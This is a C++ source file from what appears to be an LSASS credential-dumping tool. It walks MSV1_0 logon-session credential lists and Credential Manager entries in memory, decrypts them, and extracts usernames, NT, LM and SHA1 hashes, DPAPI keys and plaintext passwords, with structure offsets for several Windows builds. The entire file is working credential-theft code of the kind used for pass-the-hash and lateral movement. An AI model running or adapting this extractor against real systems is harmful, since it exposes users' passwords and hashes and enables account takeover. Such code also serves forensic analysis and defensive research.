#include "lsa/msv_walker.h"

#include "core/text_utils.h"
#include "lsa/reader_utils.h"

#include <algorithm>
#include <cstring>
#include <unordered_set>

namespace kvc::lsa {

namespace {

constexpr std::size_t kCredListAuthPkgOffset = 8;
constexpr std::size_t kCredListPrimaryPtrOffset = 16;

constexpr std::size_t kPrimaryEncLenOffset = 24;
constexpr std::size_t kPrimaryEncMaxLenOffset = 26;
constexpr std::size_t kPrimaryEncBufOffset = 32;

constexpr std::size_t kCredManSetList1Offset = 24;
constexpr std::size_t kCredManStarterSentinelOffset = 8;
constexpr std::size_t kCredManEntryFlinkOffset = 56;
constexpr std::size_t kCredManEntryCbEncPwdOffset = 0;
constexpr std::size_t kCredManEntryEncPwdPtrOffset = 8;
constexpr std::size_t kCredManEntryUserOffset = 168;
constexpr std::size_t kCredManEntryServer2Offset = 192;

constexpr std::size_t kDecDomainLenOffset = 0;
constexpr std::size_t kDecDomainBufOffset = 8;
constexpr std::size_t kDecUserLenOffset = 16;
constexpr std::size_t kDecUserBufOffset = 24;
constexpr std::size_t kDecFlagIsIso = 40;
constexpr std::size_t kDecFlagIsNt = 41;
constexpr std::size_t kDecFlagIsLm = 42;
constexpr std::size_t kDecFlagIsSha = 43;
constexpr std::size_t kDecFlagIsDpapi = 44;

constexpr std::size_t kDecLegacyMinSize = 74;
constexpr std::size_t kDecLegacyDpapiStart = 54;
constexpr std::size_t kDecLegacyDpapiEnd = 74;
constexpr std::size_t kDecLegacyNtStart = 74;
constexpr std::size_t kDecLegacyNtEnd = 90;
constexpr std::size_t kDecLegacyLmStart = 90;
constexpr std::size_t kDecLegacyLmEnd = 106;
constexpr std::size_t kDecLegacyShaStart = 106;
constexpr std::size_t kDecLegacyShaEnd = 126;

constexpr std::size_t kDec24MinSize = 88;
constexpr std::size_t kDecA_DpapiStart = 50;
constexpr std::size_t kDecA_DpapiEnd = 70;
constexpr std::size_t kDecA_NtStart = 70;
constexpr std::size_t kDecA_NtEnd = 86;
constexpr std::size_t kDecA_LmStart = 86;
constexpr std::size_t kDecA_LmEnd = 102;
constexpr std::size_t kDecA_ShaStart = 102;
constexpr std::size_t kDecA_ShaEnd = 122;

constexpr std::size_t kDecB_NtStart = 50;
constexpr std::size_t kDecB_NtEnd = 66;
constexpr std::size_t kDecB_ShaStart = 102;
constexpr std::size_t kDecB_ShaEnd = 122;
constexpr std::size_t kDecB_DpapiStart = 122;
constexpr std::size_t kDecB_DpapiEnd = 142;

constexpr std::uint32_t kMaxCredsListNodes = 4096;
constexpr std::uint32_t kMaxPrimaryNodes = 4096;

bool all_zero(const std::vector<std::byte>& v) {
    return !v.empty() && std::all_of(v.begin(), v.end(),
                                     [](std::byte b) { return b == std::byte{0}; });
}

std::string read_utf16_buf(const core::VirtualMemory& vmem, std::uint64_t buf, std::size_t len) {
    if (buf == 0 || len == 0) return {};
    std::vector<std::byte> bytes(len);
    if (!vmem.read_bytes(buf, len, bytes)) return {};
    return core::utf16le_to_utf8(bytes);
}

} // namespace

MsvWalker::MsvWalker(const core::VirtualMemory& vmem,
                     const security::LsaSecretsExtractor* extractor,
                     const templates::MsvTemplateSpec* tmpl,
                     std::size_t credentials_ptr_offset)
    : vmem_(vmem), extractor_(extractor), tmpl_(tmpl),
      credentials_ptr_offset_(credentials_ptr_offset) {}

void MsvWalker::extract(LogonSession& session) const {
    if (session.credentials_list_ptr == 0) return;
    const std::uint64_t sentinel = session.address + credentials_ptr_offset_;
    walk_credentials_list(session.credentials_list_ptr, sentinel, session.msv_credentials);
    for (auto& c : session.msv_credentials) {
        if (c.username.empty()) c.username = session.username;
        if (c.domainname.empty()) c.domainname = session.domainname;
    }
}

void MsvWalker::extract_credman(LogonSession& session) const {
    if (!tmpl_ || tmpl_->session_credman_ptr_offset == 0) return;
    auto cred_mgr = vmem_.read_u64(session.address + tmpl_->session_credman_ptr_offset);
    if (!cred_mgr || *cred_mgr == 0) return;
    auto list1 = vmem_.read_u64(*cred_mgr + kCredManSetList1Offset);
    if (!list1 || *list1 == 0) return;

    const std::uint64_t sentinel = *list1 + kCredManStarterSentinelOffset;
    auto first = vmem_.read_u64(sentinel);
    if (!first || *first == sentinel) return;
    std::uint64_t current = *first;

    int safety = 0;
    while (current != sentinel && safety++ < 255) {
        if (!vmem_.va_to_rva(current, kCredManEntryFlinkOffset + 8)) break;
        if (current < kCredManEntryFlinkOffset) break;
        const std::uint64_t entry_start = current - kCredManEntryFlinkOffset;
        if (!vmem_.va_to_rva(entry_start, 200)) break;

        auto cb_enc = vmem_.read_u32(entry_start + kCredManEntryCbEncPwdOffset).value_or(0);
        auto enc_ptr = vmem_.read_u64(entry_start + kCredManEntryEncPwdPtrOffset).value_or(0);

        const std::string user = vmem_.read_unicode_string(entry_start + kCredManEntryUserOffset);
        const std::string dom = vmem_.read_unicode_string(entry_start + kCredManEntryServer2Offset);

        std::string password, password_hex;
        if (cb_enc > 0 && enc_ptr != 0 && extractor_ && extractor_->is_initialized()) {
            std::vector<std::byte> enc(cb_enc);
            if (vmem_.read_bytes(enc_ptr, cb_enc, enc)) {
                auto dec = extractor_->decrypt(enc);
                decode_password_candidate(dec, 0, password, password_hex);
            }
        }

        if (!user.empty() || !dom.empty() || !password.empty() || !password_hex.empty()) {
            CredmanCredential c;
            c.username = user; c.domainname = dom;
            c.password = password; c.password_hex = password_hex;
            session.credman_credentials.push_back(std::move(c));
        }

        auto next = vmem_.read_u64(current);
        if (!next) break;
        if (*next != sentinel && *next != 0 && !vmem_.va_to_rva(*next, 8)) break;
        current = *next;
    }
}

void MsvWalker::walk_credentials_list(std::uint64_t list_ptr, std::uint64_t sentinel,
                                       std::vector<MsvCredential>& out) const {
    if (list_ptr == 0) return;
    std::unordered_set<std::uint64_t> visited{sentinel};
    std::uint64_t current = list_ptr;

    for (std::uint32_t n = 0; n < kMaxCredsListNodes && current != 0 && current != sentinel; ++n) {
        if (!vmem_.va_to_rva(current, 24)) break;
        if (!visited.insert(current).second) break;

        auto flink = vmem_.read_u64(current);
        if (!flink) break;
        auto primary = vmem_.read_u64(current + kCredListPrimaryPtrOffset);
        if (primary && *primary != 0) {
            walk_primary_credentials(*primary, current + kCredListPrimaryPtrOffset, out);
        }
        current = *flink;
    }
}

void MsvWalker::walk_primary_credentials(std::uint64_t primary_ptr, std::uint64_t sentinel,
                                          std::vector<MsvCredential>& out) const {
    if (primary_ptr == 0) return;
    std::unordered_set<std::uint64_t> visited{sentinel};
    std::uint64_t current = primary_ptr;

    for (std::uint32_t n = 0; n < kMaxPrimaryNodes && current != 0 && current != sentinel; ++n) {
        if (!vmem_.va_to_rva(current, 40)) break;
        if (!visited.insert(current).second) break;

        auto flink = vmem_.read_u64(current);
        if (!flink) break;
        auto enc_len = vmem_.read_u16(current + kPrimaryEncLenOffset).value_or(0);
        auto enc_max = vmem_.read_u16(current + kPrimaryEncMaxLenOffset).value_or(0);
        auto enc_buf = vmem_.read_u64(current + kPrimaryEncBufOffset).value_or(0);

        if (enc_max != 0 && enc_len > enc_max) { current = *flink; continue; }
        if (enc_len > 0 && enc_buf != 0) {
            std::vector<std::byte> bytes(enc_len);
            if (vmem_.read_bytes(enc_buf, enc_len, bytes)) {
                auto cred = decrypt_primary(bytes);
                if (!cred.username.empty() || !cred.nt_hash.empty() || !cred.dpapi.empty()) {
                    out.push_back(std::move(cred));
                }
            }
        }
        current = *flink;
    }
}

MsvCredential MsvWalker::decrypt_primary(std::span<const std::byte> encrypted) const {
    MsvCredential cred;
    if (encrypted.empty()) return cred;
    if (!extractor_ || !extractor_->is_initialized()) {
        cred.dpapi.assign(encrypted.begin(), encrypted.end());
        return cred;
    }

    auto dec = extractor_->decrypt(encrypted);
    if (dec.empty() || dec.size() < kDecLegacyMinSize) {
        cred.dpapi.assign(encrypted.begin(), encrypted.end());
        return cred;
    }

    std::uint16_t domain_len = 0, user_len = 0;
    std::uint64_t domain_buf = 0, user_buf = 0;
    std::memcpy(&domain_len, dec.data() + kDecDomainLenOffset, 2);
    std::memcpy(&domain_buf, dec.data() + kDecDomainBufOffset, 8);
    std::memcpy(&user_len, dec.data() + kDecUserLenOffset, 2);
    std::memcpy(&user_buf, dec.data() + kDecUserBufOffset, 8);

    const auto is_iso = static_cast<std::uint8_t>(dec[kDecFlagIsIso]);
    const auto is_nt = static_cast<std::uint8_t>(dec[kDecFlagIsNt]);
    const auto is_lm = static_cast<std::uint8_t>(dec[kDecFlagIsLm]);
    const auto is_sha = static_cast<std::uint8_t>(dec[kDecFlagIsSha]);
    const auto is_dpapi = static_cast<std::uint8_t>(dec[kDecFlagIsDpapi]);
    cred.is_iso_protected = (is_iso != 0);

    cred.username = read_utf16_buf(vmem_, user_buf, user_len);
    cred.domainname = read_utf16_buf(vmem_, domain_buf, domain_len);

    if (tmpl_ && tmpl_->max_build < 26100) {
        if (is_dpapi && dec.size() >= kDecLegacyDpapiEnd) {
            cred.dpapi.assign(dec.begin() + kDecLegacyDpapiStart, dec.begin() + kDecLegacyDpapiEnd);
        }
        if (is_iso == 0) {
            if (is_nt && dec.size() >= kDecLegacyNtEnd)
                cred.nt_hash.assign(dec.begin() + kDecLegacyNtStart, dec.begin() + kDecLegacyNtEnd);
            if (is_lm && dec.size() >= kDecLegacyLmEnd)
                cred.lm_hash.assign(dec.begin() + kDecLegacyLmStart, dec.begin() + kDecLegacyLmEnd);
            if (is_sha && dec.size() >= kDecLegacyShaEnd)
                cred.sha1_hash.assign(dec.begin() + kDecLegacyShaStart, dec.begin() + kDecLegacyShaEnd);
        }
        if (all_zero(cred.lm_hash)) cred.lm_hash.clear();
        return cred;
    }

    if (dec.size() >= kDec24MinSize) {
        if (is_iso == 0) {
            if (is_dpapi && dec.size() >= kDecA_DpapiEnd)
                cred.dpapi.assign(dec.begin() + kDecA_DpapiStart, dec.begin() + kDecA_DpapiEnd);
            if (is_nt && dec.size() >= kDecA_NtEnd)
                cred.nt_hash.assign(dec.begin() + kDecA_NtStart, dec.begin() + kDecA_NtEnd);
            if (is_lm && dec.size() >= kDecA_LmEnd)
                cred.lm_hash.assign(dec.begin() + kDecA_LmStart, dec.begin() + kDecA_LmEnd);
            if (is_sha && dec.size() >= kDecA_ShaEnd)
                cred.sha1_hash.assign(dec.begin() + kDecA_ShaStart, dec.begin() + kDecA_ShaEnd);
        } else {
            if (is_nt && dec.size() >= kDecB_NtEnd)
                cred.nt_hash.assign(dec.begin() + kDecB_NtStart, dec.begin() + kDecB_NtEnd);
            if (is_sha && dec.size() >= kDecB_ShaEnd)
                cred.sha1_hash.assign(dec.begin() + kDecB_ShaStart, dec.begin() + kDecB_ShaEnd);
            if (is_dpapi && dec.size() >= kDecB_DpapiEnd)
                cred.dpapi.assign(dec.begin() + kDecB_DpapiStart, dec.begin() + kDecB_DpapiEnd);
        }
        if (all_zero(cred.lm_hash)) cred.lm_hash.clear();
    }
    return cred;
}

} // namespace kvc::lsa
